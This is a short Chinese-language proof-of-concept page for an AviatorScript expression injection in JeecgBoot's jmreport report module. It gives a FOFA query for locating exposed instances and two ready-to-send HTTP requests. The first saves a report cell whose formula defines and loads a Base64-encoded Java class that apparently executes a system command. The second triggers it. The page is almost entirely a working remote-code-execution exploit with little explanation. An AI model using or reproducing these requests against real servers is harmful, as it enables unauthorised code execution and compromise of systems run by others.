# JeecgBoot系统AviatorScript表达式注入漏洞



## fofa

```yaml
body="jeecg-boot"
```

## poc

```json

POST /jeecg-boot/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123 HTTP/1.1
Host: 192.168.37.1:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 3456


{
    "loopBlockList": [],
    "area": false,
    "printElWidth": 718,
    "excel_config_id": "980882669965455363",
    "printElHeight": 1047,
    "rows": {
        "4": {
            "cells": {
                "4": {
                    "text": "=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('test', Base64Utils.decodeFromString('yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMdGVzdDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMAAoACwcAMAwAMQAyAQAEY2FsYwwAMwA0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADUBAAR0ZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAJAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAWAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAbAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADQAJABAADAAOAA0ADwAWABEADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA=='), ClassLoader.getSystemClassLoader());)",
                    "style": 0
                }
            },
            "height": 25
        },
        "len": 96,
        "-1": {
            "cells": {
                "-1": {
                    "text": "${gongsi.id}"
                }
            },
            "isDrag": true
        }
    },
    "dbexps": [],
    "toolPrintSizeObj": {
        "printType": "A4",
        "widthPx": 718,
        "heightPx": 1047
    },
    "dicts": [],
    "freeze": "A1",
    "dataRectWidth": 701,
    "background": false,
    "name": "sheet1",
    "autofilter": {},
    "styles": [
        {
            "align": "center"
        }
    ],
    "validations": [],
    "cols": {
        "4": {
            "width": 95
        },
        "len": 50
    },
    "merges": [
        "E4:F4",
        "B4:B5",
        "C4:C5",
        "D4:D5",
        "G4:G5",
        "H4:H5",
        "I4:I5",
        "D1:G1",
        "H3:I3"
    ]
}
```

![image-20240809103956986](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408091039060.png)

```json
POST /jeecg-boot/jmreport/show?previousPage=xxx&jmLink=YWFhfHxiYmI= HTTP/1.1
Host: 192.168.37.1:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 42


{
    "id": "980882669965455363"
}
```

![image-20240809104034827](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408091040880.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/H5LKy9ISLPvRmm3lpWRtew